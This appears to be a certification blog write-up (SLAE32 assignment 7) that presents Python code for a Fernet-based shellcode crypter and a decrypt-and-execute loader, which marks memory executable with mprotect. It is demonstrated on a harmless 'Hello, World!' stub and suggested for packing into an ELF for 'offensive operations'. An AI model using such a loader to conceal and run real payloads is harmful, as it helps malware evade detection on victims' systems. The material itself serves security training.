---
title: SLAE32 - Assignment 7 - Crypter
date: 2021-03-13
tags:
- SLAE32
categories:
- SLAE Exam Assignments
- SLAE 32-bit
keywords:
    - Assembly
    - Encrypter
    - Fernet
---

The seventh assignment for the SLAE32 certification asks to create a custom crypter like the one shown in the "Crypters" video. You are free to use any existing encryption schema and any programming language.
<!--more-->
I have decided to use Python3 and - after some research - to give [Fernet](https://cryptography.io/en/latest/fernet.html) a try.

According to the documentation ("[Limitations](https://cryptography.io/en/latest/fernet.html#limitations)" section):
> Fernet is ideal for encrypting data that easily fits in memory. As a design feature it does not expose unauthenticated bytes. This means that the complete message contents must be available in memory, making Fernet generally unsuitable for very large files at this time.

As we will use Fernet to encrypt shellcodes, this limitation is not a _show-stopper_ at all.

## Encrypter
The encrypter tool: 
* takes the shellcode to be encrypted from the _shellcode_ variable
* creates a salt taking 16 random characters from digits and ascii_uppercase
* asks the user for the encryption password
* performs the encryption process
* prints on screen the different components:
  * chosen password in plaintext
  * random salt computed
  * encrypted payload, which is a string obtained by concatenating:
    * the random salt
    * the shellcode encrypted with Fernet

The _encrypted payload_ must be copied into the Decrypt-Exec utility.

``` python
import string
import random

import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


# Update here the shellcode to be encrypted
shellcode = b"<INSERT-HERE-SHELLCODE>"

salt = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt.encode(),
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
cipher_text = cipher_suite.encrypt(shellcode)

encrypted_payload = salt.encode() + cipher_text

print ("--------------------------------------------------------")
print ("Chosen password: ", plain_pwd)
print ("")
print ("--------------------------------------------------------")
print ("Random salt: ", salt)
print ("")
print ("--------------------------------------------------------")
print ("Encrypted payload: ")
print ("")
print (encrypted_payload)
print ("")
print ("--------------------------------------------------------")
```


## Decrypter
The decryption-exec tool:
* takes the encrypted string generated with previous tool from the *encrypted_payload* variable and then splits it into the two different components:
  * the salt (first 16 characters)
  * the cipher_text (other characters)
* asks the user for the password (which has to be the same used for the encryption, of course)
* builds the _key derivation function_ using the salt, with same algorithm used in the encryption
* performs the decryption, thus having the original shellcode into *shellcode_data* variable
* puts the shellcode in memory and cast it to *invoke_shellcode* function
* sets the memory pages to executable
* executes the shellcode

``` python
import string
import base64

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import *


# Update here the shellcode to be decrypted
encrypted_payload = b"<INSERT-HERE-ENCRYPTED-SHELLCODE>"


salt = encrypted_payload[:16]
cipher_text = encrypted_payload[16:]

plain_pwd = input("Enter the password: ")

kdf = PBKDF2HMAC(
	algorithm = hashes.SHA256(),
	length = 32,
	salt = salt,
	iterations = 1000,
)
key = base64.urlsafe_b64encode(kdf.derive(plain_pwd.encode()))

cipher_suite = Fernet(key)
shellcode_data = cipher_suite.decrypt(cipher_text)


shellcode=create_string_buffer(shellcode_data)
invoke_shellcode = cast(shellcode, CFUNCTYPE(None))

libc = CDLL('libc.so.6')
pagesize = libc.getpagesize()
address = cast(invoke_shellcode, c_void_p).value
address_page = (address // pagesize) * pagesize

for page_start in range(address_page, address+len(shellcode_data), pagesize):
	assert libc.mprotect(page_start, pagesize, 0x7) == 0
invoke_shellcode()
```

## Proof of Concept
All Proof of Concept files are stored in the "PoC" subdirectory under "Assignment-7".  

I have created `hello.nasm` to test the encrypt-decrypt-execute process. Its purpose is to print on screen the string "Hello, World!" (pointer to memory address is gathered via JMP-CALL-POP technique) and then perform a `exit(12)`.
```
global _start

section .text

_start:
	jmp short set_to_stack

execute:
	pop ecx
	
	xor eax, eax
	mov ebx, eax
	mov edx, eax

	mov al, 0x4
	mov bl, 0x1
	mov dl, 0xd

	int 0x80

	mov al, 0x1
	mov bl, 0xc
	int 0x80

set_to_stack:
	call execute
	db "Hello, World!"
```

The shellcode has been compiled using `compile.sh`, the following screenshot shows a sample run of the compiled file:
![Running the raw payload](/writeups/img/slae7-01.png)

Shellcode has been extracted with `getShellcode.sh` and the inserted in the _shellcode_ variable in `Encrypt-Hello.py`.  
Running it, the details of encrypted payload are printed on the screen:
![Running the encrypter](/writeups/img/slae7-02.png)

The encrypted payload is then put into *encrypted_payload* variable in `Decrypt-Exec-Hello.py` and it is then executed. User is asked for the password and, if correct, the decrypted shellcode is executed:
![Running the Decrypt-Exec tool](/writeups/img/slae7-03.png)

As an additional step, I wondered if the Decrypt-Exec Python tool can be converted into an ELF file and eventually moved to the _target_ machine during offensive operations. Google came in help, pointing me to the [PyInstaller](https://www.pyinstaller.org/) bundler utility.  
Using the --onefile argument, I have been able to create a single ELF file from my Python tool:
```
/home/kali/.local/bin/pyinstaller --onefile ./Decrypt-Exec-Hello.py
```
Here is the result of the execution:
![Encoding example](/writeups/img/slae7-04.png)


## Possible evolutions
Future evolution of the utility is to remove the salt from the beginning of the encrypted string, not to leave any kind of hint on the decryption keys in the decryption tool and thus making any bruteforce attempt way more time-consuming.
The salt will be then asked to the user launching the decryption tool, along with the password.


<!-- SLAE32 Disclaimer -->
_________________
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

**Student ID**: `SLAE - 1547`  
**GitHub repository**: [https://github.com/andrea-perfetti/SLAE32-Exam](https://github.com/andrea-perfetti/SLAE32-Exam)

This assignment has been written on a Kali Linux 2021.1 x86 virtual machine:
```
┌──(kali㉿kali)-[~]
└─$ uname -a 
Linux kali 5.10.0-kali3-686-pae #1 SMP Debian 5.10.13-1kali1 (2021-02-08) i686 GNU/Linux
```